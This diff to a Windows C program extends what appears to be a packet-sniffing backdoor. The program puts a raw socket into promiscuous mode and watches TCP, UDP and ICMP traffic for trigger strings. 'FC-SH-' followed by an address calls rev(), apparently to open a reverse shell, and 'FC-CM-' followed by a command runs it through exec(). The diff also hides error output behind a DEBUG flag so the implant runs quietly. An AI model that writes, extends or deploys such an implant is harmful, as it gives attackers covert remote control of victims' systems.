@@ -20,6 +20,23 @@ struct sockaddr_in* GetIP() {
 	return ret;
 }
 
+void something(int payloadLength, char* data)
+{
+	if (payloadLength > 6)
+					{
+						if (strncmp(data, "FC-SH-", 6) == 0)
+						{
+							char* rip = (char*)data + 6;
+							rev(rip);
+						}
+						else if (strncmp(data, "FC-CM-", 6) == 0)
+						{
+							char* cmd = (char*)data + 6;
+							exec(cmd);
+						}
+					}
+}
+
 int main(int argc, char** argv) 
 {
 	WSADATA wsaData;
@@ -28,7 +45,9 @@ int main(int argc, char** argv)
 	SOCKET sd = socket(AF_INET, SOCK_RAW, IPPROTO_IP);
 	if (sd == INVALID_SOCKET) 
 	{
+#ifdef DEBUG
 		fprintf(stderr, "socket() failed: %u", WSAGetLastError());
+#endif
 		exit(-1);
 	}
 
@@ -42,7 +61,9 @@ int main(int argc, char** argv)
 	int rc = bind(sd, (struct sockaddr*)&addr, sizeof(addr));
 	if (rc == SOCKET_ERROR) 
 	{
+#ifdef DEBUG
 		fprintf(stderr, "bind() failed: %u", WSAGetLastError());
+#endif
 		exit(-1);
 	}
 
@@ -51,7 +72,9 @@ int main(int argc, char** argv)
 	rc = WSAIoctl(sd, SIO_RCVALL, &value, sizeof(value), NULL, 0, &out, NULL, NULL);
 	if (rc == SOCKET_ERROR) 
 	{
+#ifdef DEBUG
 		fprintf(stderr, "WSAIoctl() failed: %u", WSAGetLastError());
+#endif
 		exit(-1);
 	}
 
@@ -64,42 +87,62 @@ int main(int argc, char** argv)
 		int rc = recv(sd, (char*)buffer + BUFFER_OFFSET_IP, BUFFER_SIZE_IP, 0);
 		if (rc == SOCKET_ERROR) 
 		{
+#ifdef DEBUG
 			fprintf(stderr, "recv() failed: %u", WSAGetLastError());
+#endif
 			exit(-1);
 		}
 
 		struct ip_hdr_s* ip_header = (buffer+BUFFER_OFFSET_IP);
 		uint8_t l4_protocol = ip_header->ip_p;
-		if (l4_protocol == 6) 
+		if (l4_protocol == IPPROTO_TCP) 
 		{
 			struct tcp_hdr_s* tcp_header = (buffer + BUFFER_OFFSET_L4);
 			uint16_t sport = ntohs(tcp_header->th_sport);
 			if (sport == SRC_PORT || sport == SRC_PORT_2)
 			{
 				uint16_t flag = (uint16_t)tcp_header->th_flags;
-				BOOL push = (flag >> 3) % 2;
-				if (push) 
+				if (flag >> 3 % 2) 
 				{
-					char* data = (char*)(buffer + BUFFER_OFFSET_DATA);
+					char* data = (char*)(buffer + BUFFER_OFFSET_TCP_DATA);
 					int buffoffdata = BUFFER_SIZE_TCP;
 					int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_TCP;
 					data[payloadLength - 1] = '\0';
 
-					if (payloadLength > 6)
-					{
-						if (strncmp(data, "FC-SH-", 6) == 0)
-						{
-							char* rip = (char*)data + 6;
-							rev(rip);
-						}
-						else if (strncmp(data, "FC-CM-", 6) == 0)
-						{
-							char* cmd = (char*)data + 6;
-							exec(cmd);
-						}
-					}
+					something(payloadLength, data);
 				}
 			}
+		}
+		else if (l4_protocol == IPPROTO_UDP)
+		{
+			struct udp_hdr_s* udp_header = (buffer + BUFFER_OFFSET_L4);
+			uint16_t sport = ntohs(udp_header->source);
+			if (sport == SRC_PORT || sport == SRC_PORT_2)
+			{
+				char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
+				int buffoffdata = BUFFER_SIZE_UDP;
+				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_UDP;
+				data[payloadLength - 1] = '\0';	
+
+				something(payloadLength, data);
+			}
+
+		}
+		else if (l4_protocol == IPPROTO_ICMP)
+		{
+			struct icmp_hdr_s* icmp_header = (buffer + BUFFER_OFFSET_L4);	
+			uint8_t scode = icmp_header->code;
+			uint8_t stype = icmp_header->type;
+			if (scode == 1 && stype == 8)
+			{
+				char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
+				int buffoffdata = BUFFER_SIZE_ICMP;
+				int payloadLength = ntohs(ip_header->ip_len) - 20 - BUFFER_SIZE_ICMP;
+				data[payloadLength - 1] = '\0';	
+
+				something(payloadLength, data);
+			}
+
 		}
 	}
 	return 0;
